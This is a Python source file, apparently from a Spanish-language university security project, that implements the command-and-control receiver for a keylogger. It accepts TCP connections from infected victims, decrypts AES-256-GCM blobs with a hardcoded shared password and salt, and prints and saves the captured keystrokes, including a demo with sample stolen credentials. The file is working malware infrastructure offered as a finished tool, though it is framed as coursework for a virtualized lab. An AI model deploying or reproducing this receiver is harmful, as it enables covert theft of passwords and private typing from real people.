#!/usr/bin/env python3
"""
=============================================================================
Proyecto Unidad 2 - Seguridad Informática
Ejercicio 2: Servidor C2 (Command & Control) - Receptor y Descifrador
=============================================================================

Descripción general:
    Este módulo implementa el lado del atacante/receptor:
      1. Escucha en un puerto TCP configurable conexiones entrantes del keylogger.
      2. Recibe los blobs cifrados con AES-256-GCM.
      3. Descifra cada blob usando la misma clave derivada que el keylogger.
      4. Muestra el contenido descifrado en pantalla (lo que la víctima ha escrito).
      5. Almacena los datos descifrados en un archivo de log local para análisis.

Protocolo de recepción:
    - Se esperan 4 bytes (big-endian uint32) indicando la longitud del payload.
    - Luego se reciben exactamente esa cantidad de bytes (el blob cifrado).
    - El blob tiene formato: nonce (12B) || ciphertext || tag GCM

Uso:
    python3 server.py [--port PUERTO] [--output ARCHIVO]

Requerimientos:
    pip install cryptography

Autor: Proyecto académico - Entorno controlado virtualizado
=============================================================================
"""

import os
import sys
import struct
import socket
import logging
import argparse
import threading
from datetime import datetime
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError:
    print("[ERROR] Instale: pip install cryptography")
    sys.exit(1)


# =============================================================================
# CONFIGURACIÓN - debe coincidir EXACTAMENTE con keylogger.py
# =============================================================================

MASTER_PASSWORD = b"S3guridad_UTalca_2026"
SALT            = b"proyect0_keylogger_salt_v1"
KEY_ITERATIONS  = 200_000

DEFAULT_PORT   = 9999
DEFAULT_HOST   = "192.168.56.10"   # escuchar en interfaz host-only
OUTPUT_DIR     = Path("./received_logs")
OUTPUT_FILE    = OUTPUT_DIR / "captured_keystrokes.txt"


# =============================================================================
# CRIPTOGRAFÍA (mismas funciones que keylogger.py)
# =============================================================================

def derive_key(password: bytes, salt: bytes, iterations: int) -> bytes:
    """
    Deriva la clave AES-256 usando PBKDF2-HMAC-SHA256.

    Debe usar exactamente los mismos parámetros que el keylogger para
    producir la misma clave. Si algún parámetro difiere, el descifrado fallará.

    Args:
        password:   Contraseña/semilla maestra.
        salt:       Sal criptográfica (idéntica a la del keylogger).
        iterations: Número de iteraciones PBKDF2.

    Returns:
        bytes: Clave AES-256 de 32 bytes.
    """
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
    )
    return kdf.derive(password)


def decrypt_data(blob: bytes, key: bytes) -> bytes:
    """
    Descifra un blob producido por el keylogger con AES-256-GCM.

    El tag GCM garantiza la integridad: si alguien interceptó y modificó
    el ciphertext (ataque MITM), el tag no coincidirá y se lanzará
    InvalidTag, rechazando los datos manipulados.

    Args:
        blob: nonce (12B) || ciphertext || tag GCM.
        key:  Clave AES-256 de 32 bytes.

    Returns:
        bytes: Datos descifrados.

    Raises:
        cryptography.exceptions.InvalidTag: Si el blob fue manipulado.
    """
    aesgcm     = AESGCM(key)
    nonce      = blob[:12]
    ciphertext = blob[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)


# =============================================================================
# MANEJADOR DE CLIENTES
# =============================================================================

class ClientHandler(threading.Thread):
    """
    Hilo que maneja una conexión entrante de un keylogger víctima.

    Cada conexión se procesa en un hilo separado para soportar múltiples
    víctimas simultáneas (aunque en esta demo solo hay una).

    Flujo:
        1. Leer 4 bytes de longitud.
        2. Leer `longitud` bytes del payload cifrado.
        3. Descifrar con AES-256-GCM.
        4. Mostrar en consola y guardar en disco.
    """

    def __init__(self, conn: socket.socket, addr: tuple, key: bytes, output_file: Path):
        """
        Args:
            conn:        Socket de la conexión aceptada.
            addr:        Tupla (host, port) del cliente (víctima).
            key:         Clave AES-256 para descifrado.
            output_file: Archivo donde guardar los datos descifrados.
        """
        super().__init__(daemon=True)
        self._conn        = conn
        self._addr        = addr
        self._key         = key
        self._output_file = output_file

    def run(self):
        """
        Proceso completo de recepción, descifrado y almacenamiento.
        """
        client_ip, client_port = self._addr
        logging.info(f"[SERVER] Conexión entrante de {client_ip}:{client_port}")

        try:
            # ---- Paso 1: Leer longitud del payload ----
            length_bytes = self._recv_exact(4)
            if not length_bytes:
                logging.warning(f"[SERVER] Conexión cerrada prematuramente por {client_ip}")
                return

            payload_length = struct.unpack(">I", length_bytes)[0]

            if payload_length == 0 or payload_length > 10 * 1024 * 1024:  # máx 10 MB
                logging.warning(f"[SERVER] Longitud inválida: {payload_length} bytes")
                return

            # ---- Paso 2: Recibir el payload cifrado ----
            encrypted_blob = self._recv_exact(payload_length)
            if not encrypted_blob:
                logging.warning(f"[SERVER] No se recibió payload completo de {client_ip}")
                return

            logging.info(f"[SERVER] Recibidos {payload_length} bytes cifrados de {client_ip}:{client_port}")

            # ---- Paso 3: Descifrar ----
            plaintext = decrypt_data(encrypted_blob, self._key)
            decoded   = plaintext.decode("utf-8", errors="replace")

            # ---- Paso 4: Mostrar y guardar ----
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            separator = "=" * 70

            output = (
                f"\n{separator}\n"
                f"[RECIBIDO] {timestamp} | Origen: {client_ip}:{client_port}\n"
                f"{separator}\n"
                f"{decoded}\n"
                f"{separator}\n"
            )

            # Mostrar en consola
            print(output)
            sys.stdout.flush()

            # Guardar en archivo
            self._output_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self._output_file, "a", encoding="utf-8") as f:
                f.write(output)

            logging.info(f"[SERVER] Datos guardados en {self._output_file}")

        except Exception as e:
            from cryptography.exceptions import InvalidTag
            if isinstance(e, InvalidTag):
                logging.error(
                    f"[SERVER] Tag GCM inválido desde {client_ip} - "
                    "datos manipulados o clave incorrecta (MITM detectado)."
                )
                print(f"\n[!] ALERTA: Tag GCM inválido desde {client_ip} - "
                      "posible ataque MITM o clave errónea.\n")
            else:
                logging.error(f"[SERVER] Error procesando conexión de {client_ip}: {e}")
        finally:
            self._conn.close()

    def _recv_exact(self, n: int) -> bytes | None:
        """
        Recibe exactamente `n` bytes del socket, haciendo múltiples recv()
        si es necesario (TCP puede fragmentar los datos).

        Args:
            n: Número exacto de bytes a recibir.

        Returns:
            bytes: Datos recibidos, o None si la conexión se cerró antes.
        """
        data = b""
        while len(data) < n:
            chunk = self._conn.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data


# =============================================================================
# SERVIDOR PRINCIPAL
# =============================================================================

def run_server(host: str, port: int, key: bytes, output_file: Path):
    """
    Inicia el servidor TCP y acepta conexiones en un bucle infinito.

    Cada conexión aceptada se despacha a un ClientHandler en un hilo separado.
    SO_REUSEADDR permite reiniciar el servidor rápidamente sin esperar TIME_WAIT.

    Args:
        host:        Interfaz de red en la que escuchar (0.0.0.0 = todas).
        port:        Puerto TCP.
        key:         Clave AES-256 para descifrado.
        output_file: Ruta del archivo de log.
    """
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((host, port))
    server_sock.listen(5)

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║         SERVIDOR C2 - Receptor de Keylogger                 ║
║  Escuchando en: {host}:{port:<46}║
║  Guardando en:  {str(output_file):<46}║
╚══════════════════════════════════════════════════════════════╝
[*] Esperando conexiones... (Ctrl+C para detener)
""")

    logging.info(f"[SERVER] Escuchando en {host}:{port}")

    try:
        while True:
            conn, addr = server_sock.accept()
            handler = ClientHandler(conn, addr, key, output_file)
            handler.start()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido por el usuario.")
        logging.info("[SERVER] Detenido.")
    finally:
        server_sock.close()


# =============================================================================
# DEMOSTRACIÓN LOCAL (sin red)
# =============================================================================

def demo_encrypt_decrypt(key: bytes):
    """
    Función de demostración que muestra el ciclo completo:
    cifrado → transmisión (simulada) → descifrado.

    Evidencia visual del Ejercicio 2 sin necesidad de dos máquinas.

    Args:
        key: Clave AES-256.
    """
    from keylogger import encrypt_data  # importar función del keylogger

    print("\n" + "=" * 60)
    print("DEMO: Ciclo completo cifrado → descifrado")
    print("=" * 60)

    # Simular datos capturados
    sample_text = "usuario: admin\ncontraseña: MiPass123!\n[ENTER]\n"
    print(f"[1] Texto capturado (plaintext):\n{sample_text}")

    # Cifrar
    encrypted = encrypt_data(sample_text.encode(), key)
    print(f"[2] Cifrado (hex, primeros 64B): {encrypted[:64].hex()}...")
    print(f"    Tamaño total: {len(encrypted)} bytes (incluye 12B nonce + tag 16B)")

    # Descifrar
    decrypted = decrypt_data(encrypted, key)
    print(f"[3] Descifrado:\n{decrypted.decode()}")
    print("=" * 60 + "\n")


# =============================================================================
# PUNTO DE ENTRADA
# =============================================================================

def parse_args() -> argparse.Namespace:
    """
    Parsea los argumentos de línea de comandos.

    Returns:
        argparse.Namespace: Argumentos parseados.
    """
    parser = argparse.ArgumentParser(
        description="Servidor C2 - Receptor del Keylogger"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Puerto TCP de escucha (default: {DEFAULT_PORT})"
    )
    parser.add_argument(
        "--host",
        type=str,
        default=DEFAULT_HOST,
        help=f"Interfaz de red (default: {DEFAULT_HOST})"
    )
    parser.add_argument(
        "--output",
        type=str,
        default=str(OUTPUT_FILE),
        help=f"Archivo de salida para logs descifrados (default: {OUTPUT_FILE})"
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        help="Ejecutar demo local de cifrado/descifrado sin red"
    )
    return parser.parse_args()


def main():
    """
    Función principal del servidor:
        1. Parsea argumentos.
        2. Configura logging.
        3. Deriva la clave AES-256 (idéntica a la del keylogger).
        4. Ejecuta demo o inicia el servidor según flags.
    """
    args = parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

    print("[*] Derivando clave AES-256...")
    aes_key = derive_key(MASTER_PASSWORD, SALT, KEY_ITERATIONS)
    print("[*] Clave derivada correctamente.")

    output_file = Path(args.output)

    if args.demo:
        demo_encrypt_decrypt(aes_key)
        return

    run_server(args.host, args.port, aes_key, output_file)


if __name__ == "__main__":
    main()
